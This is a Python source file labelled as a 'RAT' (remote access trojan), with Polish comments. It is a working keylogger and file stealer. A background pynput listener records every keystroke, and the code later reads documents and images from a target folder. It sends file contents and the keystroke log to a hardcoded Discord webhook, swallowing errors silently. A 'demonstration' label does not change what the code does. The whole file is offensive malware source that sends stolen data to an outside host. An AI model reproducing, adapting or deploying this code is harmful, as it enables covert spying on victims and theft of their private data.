# ===================================================
# RAT BY k4v9
# ===================================================

import os
import requests
import time
from datetime import datetime
from pynput import keyboard
import threading
import sys

# --- KONFIGURACJA (EDYTUJ) ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1508093660598636565/vteo07lEk6cL09f7-_EjOxl33JLlepl4BDFVVN35MKB3hEvWsv4_Rqm0dOCSDfDPbuIJ"  # <-- WKLEJ SWÓJ
DOCELOWY_KATALOG = r"C:\DeskTop"
ROZSZERZENIA = [".txt", ".docx", ".xlsx", ".jpg", ".png"]

# Utwórz katalog docelowy jeśli nie istnieje
os.makedirs(DOCELOWY_KATALOG, exist_ok=True)

def wyslij_do_discorda(wiadomosc):
    """Wysyła wiadomość do Discorda."""
    try:
        requests.post(WEBHOOK_URL, json={"content": wiadomosc}, timeout=2)
    except:
        pass

def loguj_klawisz(klawisz):
    """Callback dla pynput."""
    try:
        with open(os.path.join(DOCELOWY_KATALOG, "log_klawiszy.txt"), "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {klawisz}\n")
    except:
        pass

def nasluch_klawiszy():
    """Uruchomienie nasłuchu klawiszy."""
    with keyboard.Listener(on_press=loguj_klawisz) as listener:
        listener.join()

def zbierz_i_wyslij_pliki():
    """Przeszukuje DOCELOWY_KATALOG i wysyła pliki."""
    wyslij_do_discorda(f"**Rozpoczęcie zbierania plików z:** {DOCELOWY_KATALOG}")
    for root, dirs, files in os.walk(DOCELOWY_KATALOG):
        for plik in files:
            if any(plik.lower().endswith(ext) for ext in ROZSZERZENIA):
                pelna_sciezka = os.path.join(root, plik)
                try:
                    with open(pelna_sciezka, "r", encoding="utf-8") as f:
                        zawartosc = f.read()
                    wyslij_do_discorda(f"**Plik:** {plik}\n```{zawartosc[:500]}...```")
                except Exception as e:
                    wyslij_do_discorda(f"Błąd odczytu {plik}: {e}")
                time.sleep(1)

def wyslij_log_klawiszy():
    """Wysyła logi klawiszy."""
    log_path = os.path.join(DOCELOWY_KATALOG, "log_klawiszy.txt")
    if os.path.exists(log_path):
        with open(log_path, "r", encoding="utf-8") as f:
            tresc = f.read()[-2000:]
        wyslij_do_discorda(f"**Log klawiszy (ost. 2000 zn.):**\n```{tresc}```")
        # Po wysłaniu usuń plik z logami (opcjonalnie)
        # os.remove(log_path)

def main():
    """Główna funkcja demonstracji."""
    wyslij_do_discorda("**DEMONSTRACJA RAT - START**")
    
    # Nasłuch klawiszy przez wchuj duzo sekund w tle
    thread_klawisze = threading.Thread(target=nasluch_klawiszy, daemon=True)
    thread_klawisze.start()
    
    # Czekaj 21 600 sekund
    time.sleep(21 600)
    
    # Zbieranie i wysyłanie plików
    zbierz_i_wyslij_pliki()
    wyslij_log_klawiszy()
    wyslij_do_discorda("**DEMONSTRACJA ZAKOŃCZONA**")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # W razie błędu wysyłamy informację na Discorda
        try:
            requests.post(WEBHOOK_URL, json={"content": f"BŁĄD: {str(e)}"}, timeout=2)
        except:
            pass